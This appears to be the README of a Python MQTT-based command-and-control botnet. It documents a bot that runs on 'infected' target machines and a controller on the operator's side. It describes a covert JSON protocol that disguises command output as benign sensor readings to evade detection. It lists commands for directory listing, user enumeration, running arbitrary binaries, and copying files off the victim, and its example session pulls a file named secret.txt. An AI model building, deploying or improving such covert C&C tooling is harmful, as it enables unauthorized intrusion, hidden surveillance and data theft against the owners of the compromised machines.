# MQTT C&C Bot and Controller

This project implements a hidden Command and Control (C&C) architecture using the MQTT protocol. It consists of a `bot.py` (running on the infected target machine) and a `controller.py` (running on the operator's machine). Communication is performed over a public MQTT broker using a specific shared topic.

## Custom C&C Communication Protocol

The communication relies on JSON payloads exchanged over the `sensors` topic. The protocol is designed to look like sensor data to avoid immediate detection.

**Command Format (Controller -> Bot)**

The controller sends commands as JSON objects with the following structure:
```
{
  "sensor_id": "<TARGET_ID_OR_ALL>",
  "sender_id": "<CONTROLLER_ID>",
  "action": "<COMMAND_NAME>",
  "params": "<OPTIONAL_PARAMETERS>",
  "timestamp": <UNIX_TIMESTAMP>
}
```
 - sensor_id: The ID of the specific bot to target, or `"all"` to broadcast to every bot.
 - action: The specific instruction (e.g., `announce`, `ls`, `w`).

**Response Format (Bot -> Controller)**

Bots respond with JSON objects. To hide the nature of the traffic, the `type` field masquerades as benign sensor data:
```
{
  "controller_id": "<CONTROLLER_ID>",
  "sender_id": "<BOT_ID>",
  "type": "<RESPONSE_TYPE>",
  "payload": "<COMMAND_OUTPUT_OR_DATA>",
  "timestamp": <UNIX_TIMESTAMP>
}
```

**Fake Response Types:**

 - w command output -> connected_users
 - ls command output -> shopping_list_content
 - id command output -> ping_with_id
 - Binary execution output -> specialized_sensor_info
 - File transfer -> log_file (Payload is Base64 encoded)

## Setup and Installation

**1. Requirements**

The project requires Python 3 and the `paho-mqtt` library.

**2. Create a Virtual Environment (venv)**

It is recommended to run this project in a virtual environment to manage dependencies.


Linux/macOS:
```
python3 -m venv .venv
source .venv/bin/activate
```


Windows:
```
python -m venv .venv
.venv\Scripts\activate
```
**3. Install Dependencies**

With the virtual environment active, install the required packages:
```
pip install -r requirements.txt
```

## Running the System

**1. Start the Bot(s)**

On the target machine(s), run the bot script. Each bot will automatically generate a random ID (e.g., `sensor_123`) and connect to the broker.
```
python bot.py
```

**2. Start the Controller**

On your machine, run the controller script. It will generate a random controller ID and enter an interactive command loop.
```
python controller.py
```

## Using the Controller

Once `controller.py` is running, you will see an `Enter command:` prompt. Below is the list of supported commands.

**Targeting**

When prompted for a *Target ID*, you can enter:
 - The specific ID of a bot (e.g., `sensor_45`).
 - `all`: This will send the command to all listening bots.

**Commands**

| Command | Description | Parameters |
| --- | --- | --- |
| `announce` | Asks bots to reveal their presence. | None. (Automatically sends to "all"). |
| `ls` | Lists the contents of a directory. | Path (optional): The directory to list. If left empty, lists the bot's current directory. |
| `log` | Copies a file from the bot to the controller. | Path to file: The full path of the file on the bot's machine. The file will be saved in the `received/` folder on the controller. |
| `s_info` | Executes a specific binary on the bot. | Path to executable: The full path to the binary (e.g., `/usr/bin/ps`). |
| `w` | Lists logged-in users on the infected machine. | None. |
| `id` | Gets the identity of the user running the bot. | None. |
| `exit` | Closes the controller application. | None. |

**Example Session:**
```
Enter command: announce
Sent: announce to all
... (Responses from sensor_84, sensor_12 ...)

Enter command: ls
Target ID: sensor_84
Path (optional): /tmp
... (Listing of /tmp received as "shopping_list_content")

Enter command: log
Target ID: sensor_84
Path to file: /home/user/secret.txt
... (File saved to received/sensor_84_[timestamp].txt)
```
